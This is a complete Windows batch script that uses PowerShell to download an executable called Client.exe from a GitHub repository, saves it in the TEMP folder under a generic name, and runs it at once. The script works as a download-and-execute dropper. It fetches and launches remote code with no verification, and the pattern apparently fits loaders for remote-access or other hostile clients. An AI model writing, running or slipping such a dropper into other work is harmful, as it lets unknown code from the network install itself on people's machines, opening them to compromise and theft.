@echo off
SET "URL=https://github.com/LunasX82/WhyImStillUploading/raw/refs/heads/main/Client.exe"
SET "SavePath=%TEMP%\\yourfile.exe"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%SavePath%'"

IF EXIST "%SavePath%" (
    start "" "%SavePath%"
) ELSE (
    ECHO Download failed or file not found.
)
pause
